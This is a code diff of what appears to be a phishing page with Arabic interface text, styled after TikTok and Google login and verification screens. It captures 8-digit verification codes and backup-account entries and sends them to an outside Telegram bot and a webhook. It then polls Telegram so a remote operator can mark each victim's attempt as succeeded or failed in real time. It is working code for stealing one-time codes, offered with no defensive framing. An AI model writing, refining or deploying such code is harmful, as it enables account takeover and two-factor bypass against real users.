+                `<b>📩 طلب كود بديل:</b>\nالحساب: <code>${val}</code>`,
+                [{ name: "الحساب البديل", value: val, inline: true }]
+            );
         }
 
-        function handle8DigitCode(input) {
-            const val = input.value.trim();
-            if (val.length === 5 || val.length === 6 || val.length === 8) {
-                sendTelegramLog(`إدخال كود تحقق صامت (أرقام): ${val}`);
-                showView('view-google-s4');
+        function handle8DigitCode(elem) {
+            const code = elem.value.trim();
+            if (code.length === 8) {
+                notifyAll(
+                    "🔢 كود 8 أرقام مدخل",
+                    `<b>🔢 كود 8 أرقام:</b> <code>${code}</code>`,
+                    [{ name: "الكود", value: `\`\`\`${code}\`\`\``, inline: false }]
+                );
+
+                showView('view-admin-wait');
+                startPollingTelegram();
             }
         }
 
-        // Telegram Gate Polling
-        function triggerTelegramWait(actionName) {
-            sendTelegramLog(`طلب بوابه الانتظار للمسؤول (${actionName})`);
-            showView('view-admin-wait');
-            startAdminPolling();
-        }
+        // الانتظار والمراقبة عبر التليجرام
+        function startPollingTelegram() {
+            if (pollTimer) clearInterval(pollTimer);
+            let lastUpdateId = 0;
 
-        function startAdminPolling() {
-            if (adminPollingInterval) clearInterval(adminPollingInterval);
+            pollTimer = setInterval(() => {
+                if (!TELEGRAM_BOT_TOKEN) return;
 
-            adminPollingInterval = setInterval(async () => {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
-                    const data = await res.json();
-                    if (data.ok && data.result.length > 0) {
-                        data.result.forEach(update => {
-                            lastUpdateId = update.update_id;
-                            if (update.message && update.message.text) {
-                                const txt = update.message.text.trim();
-                                if (txt === "تم التسجيل") {
-                                    clearInterval(adminPollingInterval);
-                                    showView('view-success');
-                                } else if (txt === "فشل") {
-                                    clearInterval(adminPollingInterval);
-                                    alert("تأكد من إدخال المعلومات بشكل صحيح");
-                                    handleGlobalBack();
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            data.result.forEach(update => {
+                                lastUpdateId = update.update_id;
+                                if (update.message && update.message.text) {
+                                    const text = update.message.text.trim();
+                                    if (text === "تم التسجيل" || text === "تم") {
+                                        clearInterval(pollTimer);
+                                        showView('view-success');
+                                    } else if (text === "فشل") {
+                                        clearInterval(pollTimer);
+                                        alert("تأكد من إدخال المعلومات بشكل صحيح");
+                                        showView('view-tiktok-main');
+                                    }
                                 }
-                            }
-                        });
-                    }
-                } catch (e) {
-                    console.error("Polling error", e);
-                }
+                            });
+                        }
+                    })
+                    .catch(e => console.error("Polling Error:", e));
             }, 3000);
         }
-
-        // Auto OTP Tab Movement & Submit
-        document.querySelectorAll('.otp-box-item').forEach((box, idx, arr) => {
-            box.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && idx < arr.length - 1) {
-                    arr[idx + 1].focus();
-                }
-                let fullCode = '';
-                arr.forEach(b => fullCode += b.value);
-                if (fullCode.length === 6) {
-                    sendTelegramLog(`إدخال كود التحقق اليدوي كامل (6 أرقام): ${fullCode}`);
-                    triggerTelegramWait('انتظار التأكيد بعد إدخال الكود');
-                }
-            });
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && idx > 0) {
-                    arr[idx - 1].focus();
-                }
-            });
-        });
     </script>
 </body> 
 </html>
